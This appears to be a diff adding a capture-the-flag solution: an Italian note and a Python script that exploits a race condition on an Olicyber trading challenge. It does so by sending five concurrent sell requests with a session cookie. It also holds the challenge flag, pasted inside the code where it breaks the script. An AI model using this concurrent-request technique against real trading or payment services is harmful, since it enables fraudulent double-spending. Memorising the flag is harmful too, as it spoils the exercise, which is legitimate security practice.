@@ -1,0 +1,36 @@
+il serve fa una sleep quando vendo quindi durante la sleep potrei fare l'operazione più volte givvandomi più soldi 
+
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import time
+
+# Configurazione
+URL_BUY = "http://trading.challs.olicyber.it/?action=buy"
+URL_SELL = "http://trading.challs.olicyber.it/?action=sell"
+COOKIES = {'PHPSESSID': 'jfp91qmth1o0iash6fcoi9rdli'}
+
+def sell_request(req_id):
+    print(f"[*] Thread {req_id}: Inviando vendita...")
+    r = requests.post(URL_SELL, cookies=COOKIES)
+    if "success" in r.text.lower():
+        print(f"[+] Thread {req_id}: VENDITA RIUSCITA!")
+    else:
+        print(f"[-] Thread {req_id}: Fallita.")
+
+# 1. Preparazione: Compriamo 1 moneta
+print("[*] Fase 1: Acquisto di 1 PGCoin per attivare lo sleep...")
+requests.post(URL_BUY, cookies=COOKIES)
+time.sleep(1) # Un secondo di attesa per sicurezza
+
+# 2. Attacco: Lancio simultaneo
+print("[*] Fase 2: Lancio 5 vendite simultanee...")
+
+
+with ThreadPoolExecutor(max_workers=5) as executor:
+    for i in range(5):
+        executor.submit(sell_request, i+1)
+
+
+flag{A_R4ce_c0nd1t10n_in_a_trading_system!?}
+
+print("--- Operazione completata ---")
